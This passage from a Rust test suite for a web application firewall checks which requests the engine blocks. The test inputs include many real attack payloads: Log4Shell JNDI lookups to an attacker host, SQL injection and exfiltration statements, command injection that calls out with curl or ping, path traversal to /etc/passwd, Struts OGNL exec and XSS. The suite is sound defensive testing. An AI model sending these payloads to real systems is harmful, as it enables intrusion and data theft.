        // The Java-scoped Log4Shell needle is downgraded…
        let mut r = req("GET", "/", "");
        r.headers.push((
            "User-Agent".into(),
            "${jndi:ldap://attacker.com/x}".into(),
        ));
        let v = m.inspect(&r);
        assert!(matches!(v.action, WafAction::Monitor | WafAction::Pass));
        // …while the language-agnostic SQLi shape still blocks.
        let r = req("GET", "/a/1' or ''='/b", "");
        assert_eq!(m.inspect(&r).action, WafAction::Block);
    }

    #[test]
    fn monitored_ssti_downgrades_expr_hits_at_strict() {
        let cfg = WafEngineConfig {
            level: WafLevel::Strict,
            monitor_categories: CategorySet::from_names(["ssti"]),
            ..WafEngineConfig::default()
        };
        let m = WafEngine::new(&cfg);
        let v = m.inspect(&req(
            "GET",
            "/page",
            "tpl=${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        ));
        assert!(
            matches!(v.action, WafAction::Monitor | WafAction::Pass),
            "got {:?} details: {}",
            v.action,
            v.details
        );
        // The expr contribution reached the aggregate but not the blocking
        // subset, so the strict RCE gate (PINGWAF-1061) cannot fire on it.
        assert_eq!(v.breakdown.block_rce_score, 0);
    }

    #[test]
    fn blocks_log4shell_in_query() {
        // Regression guard: the benchmark showed this payload shape slipping
        // through, so pin the full-pipeline behavior.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/solr/admin/cores",
            "action=${jndi:ldap://${sys:java.version}.example.com}",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn referer_sqli_is_not_blocked_in_normal() {
        // A Referer quoting an SQL payload is search-result noise, not an
        // injection attempt — it must score, not block.
        let e = engine();
        let mut r = req("GET", "/article", "id=1");
        r.headers.push((
            "Referer".into(),
            "https://google.com/search?q=1' UNION SELECT password FROM users --"
                .into(),
        ));
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        assert!(matches!(v.action, WafAction::Pass | WafAction::Monitor));
    }

    #[test]
    fn strict_blocks_rce_command_substitution() {
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/login/index.php",
            "login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.)",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn blocks_traversal_masked_by_prefix_match() {
        // Regression guard: Aho-Corasick consumes non-overlapping matches,
        // so "../" swallowed the "/" that "/etc/passwd" needed. The
        // slash-less variant PT-013 must still fire.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/download",
            "page=../../../etc/passwd%00.png",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn blocks_time_based_blind_sqli() {
        // Regression guard: time-based payloads carried only a sev-4 needle
        // and scored 4 — far below the anomaly threshold — so they passed.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/api/login",
            "u=admin';WAITFOR DELAY '0:0:10'--",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn strict_blocks_js_bracket_call() {
        // Bracket-call invocation hides the callee name (often hex-escaped)
        // from keyword needles; caught structurally at Strict.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/render",
            "tpl=parent['eval'](atob('YWxlcnQoMSk='))",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn normal_passes_plain_bracket_access() {
        // Bracket text alone is not a call — Normal must stay quiet, and the
        // JS-call detector is Strict-only anyway.
        let e = engine();
        let v = e.inspect(&req("GET", "/items", "filter=rows[0].name"));
        assert_eq!(v.action, WafAction::Pass, "details: {}", v.details);
    }

    fn post_json(path: &str, body: &str) -> RequestData {
        let mut r = req("POST", path, "");
        r.headers
            .push(("Content-Type".into(), "application/json".into()));
        r.body = Some(body.as_bytes().to_vec());
        r
    }

    #[test]
    fn json_members_are_scanned_as_fields() {
        // A JSON member is a typed input: full severity at Normal, unlike
        // the demoted bulk blob.
        let e = engine();
        let v = e.inspect(&post_json(
            "/api/items",
            r#"{"q":"<script>alert(1)</script>","page":1}"#,
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn json_unicode_escapes_resolved_by_parser() {
        // serde_json resolves \u escapes before scanning, so \u003cscript\u003e
        // is visible at Normal even with the escape pass off.
        let e = engine();
        let v = e.inspect(&post_json(
            "/api/comment",
            r#"{"text":"\u003cscript\u003ealert(1)\u003c/script\u003e"}"#,
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn json_sqli_member_blocks_at_normal() {
        let e = engine();
        let v = e.inspect(&post_json(
            "/api/login",
            r#"{"user":"admin' OR 1=1 --","pass":"x"}"#,
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn nested_json_members_scanned() {
        let e = engine();
        let v = e.inspect(&post_json(
            "/api/profile",
            r#"{"meta":{"tags":["x"],"html":"<script>alert(1)</script>"}}"#,
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn crlf_in_query_is_critical() {
        // Decoded CRLF in a query value is response splitting; a body blob
        // (JSON pretty-printing) stays the only CRLF-tolerant surface.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/redirect",
            "next=https%3A%2F%2Fevil.example%2F%0d%0aX-Injected%3A%201",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn encoded_ssrf_loopback_blocked() {
        let e = engine();
        let v = e.inspect(&req("GET", "/fetch", "u=http://2130706433/admin"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        let v = e.inspect(&req("GET", "/fetch", "u=http://0x7f000001/admin"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Plain names are sev4: they score, they do not one-shot.
        let v = e.inspect(&req("GET", "/fetch", "u=http://localhost/admin"));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn powershell_encoded_command_blocked() {
        let e = engine();
        let v = e.inspect(&req("GET", "/deploy", "c=powershell+-enc+SQBFAFgA"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn truncated_tautology_blocked_at_normal() {
        // `1' or ''='` — quote-unbalanced tautology, previously invisible to
        // the six strong regexes.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/vulnerabilities/sqli/",
            "id=1%27+or+%27%27%3D%27&Submit=Submit",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn bare_select_from_blocked_at_normal() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/vulnerabilities/sqli/",
            "id=SELECT+*+FROM+all_tables&Submit=Submit",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn base64_wrapped_payload_blocked_at_normal() {
        // b64(`{"id":"1 and 1=2"}`) — the wire form hides every literal; the
        // b64 expansion must surface the tautology to the libinjection gate.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/vulnerabilities/xss_r/",
            "name=eyJpZCI6IjEgYW5kIDE9MiJ9",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn win_ini_and_whoami_pipe_blocked_at_normal() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/common/download/resource",
            "resource=/profile/../../../../Windows/win.ini",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        let mut r = req("POST", "/password_change.cgi", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(
            b"user=rootxx&pam=&expired=2&old=test|whoami&new1=test2&new2=test2"
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn overlong_utf8_xss_blocked_at_normal() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/vulnerabilities/xss_r/",
            "name=%C0%BCscript%3Ealert(1)%3C/script%3E",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn dom_prototype_chain_blocked_at_normal() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/vulnerabilities/xss_r/",
            "name=toString.constructor.prototype.toString%3DtoString.\
             constructor.prototype.call",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn ognl_shape_scores_at_normal_blocks_at_strict() {
        let payload = "#url=(@java.lang.System@getProperty('user.dir'))";
        let e = engine();
        let v = e.inspect(&req("GET", "/action", &format!("q={payload}")));
        assert_ne!(
            v.action,
            WafAction::Block,
            "Normal should only score OGNL: {}",
            v.details
        );
        let s = strict_engine();
        let v = s.inspect(&req("GET", "/action", &format!("q={payload}")));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn ognl_runtime_exec_blocked_at_normal() {
        // The exec-carrying OGNL exploit core (Struts2 S2-057 family) is
        // unambiguous RCE: CI-043 must block it even at Normal, while the
        // property-reading shape above stays score-only.
        let payload = "q=(#context=#attr['struts.valueStack'].context).\
                       (@java.lang.Runtime@getRuntime().exec('cat%20/etc/passwd'))";
        let e = engine();
        let v = e.inspect(&req("GET", "/action", payload));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn utl_inaddr_error_based_blocked_at_normal() {
        // Oracle error-based helper (UTL_INADDR.GET_HOST_NAME) is
        // exploit-only vocabulary; SQL-020 blocks it at Normal.
        let payload = "q=0.05)))%20FROM%20%22T%22%20where%20(select%20\
                       utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))\
                       %20from%20dual)%20is%20not%20null%20--";
        let e = engine();
        let v = e.inspect(&req("GET", "/vuln2/", payload));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn php_serialized_record_blocks_at_strict() {
        let payload = "data=s%3A11%3A%22avatar_link%22%3Bs%3A16%3A%22abc%22";
        let s = strict_engine();
        let v = s.inspect(&req("POST", "/api/import", payload));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn union_select_search_phrase_passes_at_normal() {
        // Search phrases are the dominant benign carrier of "union select";
        // without any statement marker (quote break-out, constant probing,
        // comment terminator or FROM clause) Normal keeps the hit weak.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/AS/Suggestions",
            "bq=site:segmentfault.com+union+select+%E6%95%99%E7%A8%8B",
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn union_select_statements_still_block_at_normal() {
        let e = engine();
        for q in [
            "id=1+union+select+username%2Cpassword+from+users",
            "id=1%27+union+select+user--",
            "id=union+select+1%2C2%2C3",
            "id=1+union+all+select+user+from+users",
        ] {
            let v = e.inspect(&req("GET", "/list", q));
            assert_eq!(v.action, WafAction::Block, "query {q}: {}", v.details);
        }
    }

    #[test]
    fn union_select_search_phrase_passes_at_strict_too() {
        // The search-phrase gate is level-independent: a bare "union select"
        // in a site-search query is benign on every level. Strict still
        // blocks the statement-shaped forms (see below).
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/AS/Suggestions",
            "bq=site:segmentfault.com+union+select+%E6%95%99%E7%A8%8B",
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        let v = e.inspect(&req("GET", "/list", "id=1%27+union+select+user--"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn sqli_reflected_mirrors_do_not_trip_family_gate() {
        // A search phrase mirrored across query and Referer is one signal,
        // not four: weak hits stay out of the family sub-score, so the
        // 1002 gate cannot be crossed by repetition.
        let mut r = req(
            "GET",
            "/AS/Suggestions",
            "bq=site:segmentfault.com+union+select+%E6%95%99%E7%A8%8B",
        );
        r.headers.push((
            "Referer".into(),
            "https://www.baidu.com/s?wd=site:segmentfault.com union select 教程"
                .into(),
        ));
        let e = engine();
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn sqli_prose_with_from_clause_still_blocks() {
        // Known tradeoff: prose carrying a full "… union select … from …"
        // shape is indistinguishable from an injected statement at the
        // lexical level (benchmark sample 92/49). Pinned so the tradeoff is
        // a conscious one.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/thread",
            "p=The+union+select+members+from+each+department+to+form+a+committee.",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn crlf_multiline_text_query_passes() {
        // Multi-line form input echoed into a query value: CRLF without a
        // following header-name shape is scored, not blocked.
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/link",
            "query=%E6%9C%89%E4%B8%A4%E4%B8%AA%E9%80%89%E9%A1%B9%0D%0A1.+%E5%90%83%E9%A5%AD%0D%0A2.+%E4%B8%8D%E5%90%83%E9%A5%AD",
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn crlf_in_referer_is_not_critical() {
        // Same rule on the Referer surface: multi-line text there is noise,
        // not response splitting.
        let mut r = req("GET", "/page", "");
        r.headers.push((
            "Referer".into(),
            "https://www.baidu.com/s?wd=line1\r\nline2".into(),
        ));
        let e = engine();
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn form_body_multiline_code_passes() {
        // A form field carrying multi-line source code (mathb.in sample):
        // CRLF inside a body surface is scored, never one-shot blocked.
        let e = engine();
        let mut r = req("POST", "/2", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body =
            Some(b"code=f(x)\r\n  y = x^2\r\n\r\nNote: plot y\r\n".to_vec());
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn normal_scores_rce_without_blocking() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/login/index.php",
            "login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.)",
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        assert!(v.score > 0);
    }

    #[test]
    fn js_uri_json_container_passes_at_normal() {
        // Telemetry beacons re-serialize DOM attributes verbatim
        // (`{"href":"javascript: void(0);"}`): a script-URI quoted inside a
        // JSON container with no tag structure is collected data, not an
        // injection. The needle and its libinjection twin both stay out.
        let e = engine();
        let mut r = req("POST", "/analytics/v2_upload", "");
        r.headers
            .push(("Content-Type".into(), "application/json".into()));
        r.body = Some(
            br#"{"common":{"browser":"Chrome(114)"},"events":[{"mapValue":{"attributes":"{\"href\":\"javascript: void(0);\",\"data-reactid\":\".c.0.1\"}","queryPath":".tc-15-tablist > li > a"}}]}"#
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn js_uri_with_tag_structure_still_blocks_at_normal() {
        let e = engine();
        let v = e.inspect(&req(
            "GET",
            "/search",
            "q=%3Csvg+onload%3Djavascript%3Aalert(1)%3E",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn bare_js_uri_value_still_blocks_at_normal() {
        // A value that *is* the script URI (reflected `?url=` payload) has
        // no container to hide in — the gate keeps it critical.
        let e = engine();
        let v = e.inspect(&req("GET", "/redirect", "url=javascript:alert(1)"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn js_uri_json_container_passes_at_strict_too() {
        // The collected-markup gate is level-independent: beacons
        // re-serialize DOM attributes ("javascript: void(0)") verbatim as
        // JSON, and this exact shape was 17 strict false positives when
        // strict kept the needle critical.
        let e = strict_engine();
        let mut r = req("POST", "/analytics/v2_upload", "");
        r.headers
            .push(("Content-Type".into(), "application/json".into()));
        r.body = Some(
            br#"{"events":[{"mapValue":{"attributes":"{\"href\":\"javascript: void(0);\"}"}}]}"#
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn form_json_field_is_unpacked_not_libinjection_matched() {
        // `param={"add":5,"delete":0}` (Aliyun console sample): the
        // `"key":value` container shape trips libinjection's quote-keyword
        // fingerprint, so the container string is replaced by its unpacked
        // members.
        let e = engine();
        let mut r = req("POST", "/buyapi/api/agreement/logAction.json", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(
            b"action=configureSecurityGroupPermissions\
              &param=%7B%22add%22%3A5%2C%22delete%22%3A0%7D"
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn nested_json_string_member_is_unpacked() {
        // A JSON member that is itself serialized JSON (telemetry icon
        // blobs) expands into typed members instead of staying an opaque
        // container string.
        let raw_body: &[u8] = br#"{"__logs__":[{"value":"{\"key\":\"HelpDoc\",\"icon\":\"\\n<svg t=\\\"1682594285904\\\" class=\\\"icon\\\" viewBox=\\\"0 0 1024 1024\\\">\"}"}]}"#;
        let headers =
            vec![("Content-Type".to_string(), "application/json".to_string())];
        let req_data = normalize_request(
            "POST",
            "/track",
            "",
            &headers,
            Some(raw_body),
            3,
            false,
        );
        let names: Vec<&str> = req_data
            .decoded_values
            .iter()
            .map(|v| v.name.as_str())
            .collect();
        // The container string is gone; members are addressed by path.
        assert!(
            !names.iter().any(|n| n.contains("value") && n.is_empty()),
            "container kept: {names:?}"
        );
        assert!(
            names.iter().any(|n| n.contains("icon")),
            "icon member missing: {names:?}"
        );
    }

    /// Form-encoded `POST` carrying `body` exactly as the wire delivered it.
    fn post_form(path: &str, body: Vec<u8>) -> RequestData {
        let mut r = req("POST", path, "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(body);
        r
    }

    #[test]
    fn non_utf8_body_is_still_inspected() {
        // Regression for the body-skip evasion: the body block used to run
        // only `if let Ok(text) = str::from_utf8(body)`, so a single
        // trailing 0xFF byte took the whole payload out of the scan
        // surface — no form parsing, no decoded value, score 0.
        let e = engine();
        let mut body = b"q=1' OR 1=1--".to_vec();
        body.push(0xFF);
        let v = e.inspect(&post_form("/api/search", body));
        assert!(v.score > 0, "body was skipped: {}", v.details);
        assert!(!v.matched_rules.is_empty(), "details: {}", v.details);
    }

    #[test]
    fn gzip_encoded_body_is_inspected() {
        // Same body, `Content-Encoding: gzip`. The request path had no
        // decompressor at all, so the deflate stream reached the detectors
        // as binary and — not being UTF-8 — hit the same early exit.
        use std::io::Write;

        use flate2::write::GzEncoder;
        use flate2::Compression;

        let mut encoder = GzEncoder::new(Vec::new(), Compression::fast());
        encoder.write_all(b"q=1' OR 1=1--").expect("gzip write");
        let body = encoder.finish().expect("gzip finish");

        let e = engine();
        let mut r = post_form("/api/search", body);
        r.headers.push(("Content-Encoding".into(), "gzip".into()));
        let v = e.inspect(&r);
        assert!(v.score > 0, "gzip body was skipped: {}", v.details);
        assert!(!v.matched_rules.is_empty(), "details: {}", v.details);
    }

    #[test]
    fn form_body_values_stay_separately_addressed() {
        // Decoding must not collapse the body into one blob: each form
        // value is its own typed field, which is what makes the SQLi
        // detectors fire on the payload rather than on the whole body.
        let headers = vec![(
            "Content-Type".to_string(),
            "application/x-www-form-urlencoded".to_string(),
        )];
        let normalized = normalize_request(
            "POST",
            "/api/search",
            "",
            &headers,
            Some(b"page=1&q=1'%20OR%201=1--"),
            3,
            false,
        );
        let names: Vec<&str> = normalized
            .decoded_values
            .iter()
            .filter(|v| v.source == ValueSource::Body && v.field)
            .map(|v| v.name.as_str())
            .collect();
        assert!(names.contains(&"q"), "values: {names:?}");
        assert!(names.contains(&"page"), "values: {names:?}");
    }

    #[test]
    fn strict_blocks_structural_ssti() {
        let e = strict_engine();
        let v = e.inspect(&req("GET", "/page", "tpl={{7*7}}"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn normal_does_not_block_structural_ssti() {
        let e = engine();
        let v = e.inspect(&req("GET", "/page", "tpl={{7*7}}"));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        assert!(v.score > 0);
    }

    #[test]
    fn strict_activates_paranoia_level_3_rules() {
        let e = strict_engine();
        // 1051 (very long URI) is a PL3 Log rule; the strict engine's
        // effective paranoia is at least 3, so it fires without extra
        // configuration — but Log only scores, it never forces a block.
        let long = "x".repeat(5000);
        let v = e.inspect(&req("GET", &format!("/{long}"), ""));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        assert!(v.matched_rules.iter().any(|m| m == "PINGWAF-1051"));
    }

    #[test]
    fn strict_body_crlf_is_not_forced_critical() {
        // FP regression guard: bare CRLF pairs inside telemetry/log bodies
        // were the dominant strict false-positive source while the CRLF
        // family was unconditionally critical on strict. Real header
        // injection still blocks through the header-name shape gate and
        // the sev5 CRLF-003/004 needles.
        let e = strict_engine();
        let mut r = req("POST", "/collect", "");
        r.headers.push((
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        ));
        r.body = Some(
            b"log=2024-01-01 12:00:00 INFO started\r\n2024-01-01 INFO done"
                .to_vec(),
        );
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn strict_path_command_hits_are_not_forced_critical() {
        // `;cat` inside a matrix-parameter path segment is storage-style
        // URL grammar, not a shell: path-source CI/Deser hits lost their
        // strict critical escalation after 18 path false positives.
        let e = strict_engine();
        let v = e.inspect(&req("GET", "/store;cat=5/items", ""));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn strict_js_uri_gate_matches_other_levels() {
        // A bare script URI in a body value has no execution context on any
        // level (collected markup); on a URL-facing surface it is a real
        // reflected-XSS shape and blocks.
        let e = strict_engine();
        let v = e.inspect(&post_json(
            "/profile",
            r#"{"bio":"read it at javascript:void(0)"}"#,
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        let v = e.inspect(&req("GET", "/redirect", "url=javascript:alert(1)"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn strict_blocks_wide_command_separators() {
        let e = strict_engine();
        for q in [
            "cmd=; whoami",
            "cmd=; uname",
            "q=| curl http://x",
            "p=|| ping 127.0.0.1",
            "h=`ping collab.example",
            "h=`curl http://collab.example",
            "e=eval(atob(btoa(1)))",
            "f=)(uid=*)(|(uid=*))",
            "g=*)(objectclass=*",
        ] {
            let v = e.inspect(&req("GET", "/run", q));
            assert_eq!(v.action, WafAction::Block, "query {q}: {}", v.details);
        }
    }

    #[test]
    fn copy_to_program_blocks_at_all_levels() {
        // Postgres COPY ... TO PROGRAM never appears outside an
        // exfiltration statement; the needle is sev5 on both engines.
        for e in [engine(), strict_engine()] {
            let v = e.inspect(&req(
                "GET",
                "/q",
                "s=copy (select '') to program 'nslookup x'",
            ));
            assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        }
    }

    #[test]
    fn web_inf_and_lua_source_paths_block() {
        // Sourced-file disclosure paths are sev5 needles — never a benign
        // path token in any deployed application layout.
        let e = strict_engine();
        for p in ["/manager/WEB-INF/web.xml", "/cn/portal_inc.lua"] {
            let v = e.inspect(&req("GET", p, ""));
            assert_eq!(v.action, WafAction::Block, "path {p}: {}", v.details);
        }
    }

    #[test]
    fn into_file_search_phrase_passes_but_statement_blocks() {
        // "into outfile / into dumpfile" quoted in a search query is a
        // phrase, not a statement — zero value on every level, needle and
        // libinjection fingerprint alike. A real exfiltration carries a
        // quoted file target and blocks.
        for e in [engine(), strict_engine()] {
            let v = e.inspect(&req(
                "GET",
                "/help",
                "q=please explain into outfile and into dumpfile syntax",
            ));
            assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        }
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/export",
            "q=select 'x' into outfile '/tmp/pwned.txt'",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn strict_crlf_with_injection_companion_is_critical() {
        // The blanket strict CRLF demotion traded away real
        // response-splitting probes whose line break smuggles a traversal:
        // a same-value injection-family companion (PT here — CI/Deser have
        // their own strict escalation) restores the critical call, while a
        // bare multi-line query value stays quiet.
        let e = strict_engine();
        let v =
            e.inspect(&req("GET", "/dl", "p=a%0d%0ab%3Fx%3D..%2F..%2Fconf"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        let v = e.inspect(&req("GET", "/log", "q=line1%0d%0aline2 goes on"));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn strict_js_call_blob_passes_but_url_surface_blocks() {
        // Bracket-call text inside an unstructured body blob is collected
        // page prose (skipped entirely, like the search-phrase rule — the
        // RCE sub-score must not re-block what the critical gate let
        // through); the same shape on a URL-facing surface stays critical.
        let e = strict_engine();
        let mut r = req("POST", "/collect", "");
        r.headers.push(("Content-Type".into(), "text/plain".into()));
        r.body =
            Some(b"paste: ctx['lookup'](val) worked\r\nnext line".to_vec());
        let v = e.inspect(&r);
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        let v = e.inspect(&req("POST", "/w", "tpl=win['constructor'](1)"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn padded_tautology_probe_blocks() {
        // Padding a probe past the 32-byte mark used to be enough to have it
        // filed as a "search phrase" and scored zero — length was the only
        // discriminator, and filler is free. The first payload is the audit's
        // shape; the second needs no quotes at all, because repetition is
        // itself a way to be long.
        let quoted = format!("q={}1'%20OR%20'1'='1", "A".repeat(29));
        let numeric = format!("id={}", ["1 OR 1=1"; 5].join("%20OR%20"));
        for e in [engine(), strict_engine()] {
            for query in [&quoted, &numeric] {
                let v = e.inspect(&req("GET", "/search", query));
                assert_eq!(
                    v.action,
                    WafAction::Block,
                    "{query} should block: {}",
                    v.details
                );
            }
        }
    }

    #[test]
    fn tautology_prose_passes_but_probe_blocks() {
        // A tautology fingerprint over a long value is prose quoting the
        // tokens ("1 and 1=1 is a very basic mathematical operation");
        // real probes are tiny, and long comment-bearing ones keep their
        // comment-terminator fingerprint.
        for e in [engine(), strict_engine()] {
            let v = e.inspect(&req(
                "GET",
                "/chat",
                "msg=1%20and%201%3D1%20is%20a%20very%20basic%20mathematical%20operation",
            ));
            assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        }
        let v = strict_engine().inspect(&req("GET", "/id", "id=1+and+1%3D1"));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        let v = strict_engine().inspect(&req(
            "GET",
            "/id",
            "id=111%27+and+1%3D2+union+select+1,schema_name+from+information_schema.schemata--+",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn long_quote_keyword_prose_passes_but_union_blocks() {
        // Keyword-list documents trip the quote-keyword fingerprint via a
        // distant apostrophe; values past 256B are prose. A real long
        // exfiltration carries UNION SELECT, which stays critical.
        let prose = format!(
            "words=can't+{}+didn't+select+a+favorite+from+the+catalog",
            "lorem+ipsum+dolor+sit+amet+".repeat(10)
        );
        assert!(prose.len() > 256);
        let v = strict_engine().inspect(&req("GET", "/help", &prose));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
        let v = strict_engine().inspect(&req(
            "GET",
            "/vuln",
            "id=%27+UNION+SELECT+%27abcdef%27,NULL,NULL--",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn unclosed_script_prose_passes_but_tag_blocks() {
        // `<script` that never closes (`1<script`, "binary<script is
        // incorrect") is a search phrase quoting the word; a real tag —
        // including `+`-spaced URL forms — stays critical.
        for e in [engine(), strict_engine()] {
            for q in [
                "q=1%3Cscript",
                "keyword=for+power,+binary%3Cscript+is+incorrect",
            ] {
                let v = e.inspect(&req("GET", "/search", q));
                assert_ne!(
                    v.action,
                    WafAction::Block,
                    "query {q}: {}",
                    v.details
                );
            }
        }
        let v = strict_engine().inspect(&req(
            "GET",
            "/x",
            "q=%3Cscript%3Ealert(1)%3C/script%3E",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        let v = strict_engine().inspect(&req(
            "GET",
            "/x",
            "q=%3Cscript+src%3Ddata:text/javascript%3Bbase64,YWxlcnQoMSk%3D%3E%3C/script%3E",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn compact_script_tag_blocks_on_reflected_sources() {
        // `<script>alert(1)</script>` opens a tag with no attributes — the
        // compact opener is a real payload on reflected surfaces (query).
        let v = engine().inspect(&req(
            "GET",
            "/x",
            "q=%3Cscript%3Ealert(1)%3C/script%3E",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn script_prose_in_path_passes() {
        // Search prose quoted into a request path (`…binary<script is
        // incorrect`) never opens a tag — no `>` terminator exists.
        let v = engine().inspect(&req(
            "GET",
            "/newview/search/for%20power%2C%20binary%3Cscript%20is%20incorrect",
            "",
        ));
        assert_ne!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn post9_missed_payload_forms_block() {
        // Deterministic coverage for shapes that replayed as real misses
        // (verdict=passed) at P5: each case below maps to one attribution.
        let e = engine();
        // PortSwigger nested-cast exfiltration (8d/78).
        let v = e.inspect(&req(
            "GET",
            "/sqli",
            "id=SELECT+CAST%28%28SELECT+password+FROM+users+LIMIT+1%29+AS+int%29",
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
        // Oracle XPATH error-based probe (9d/63).
        let v = e.inspect(&req(
            "GET",
            "/sqli",
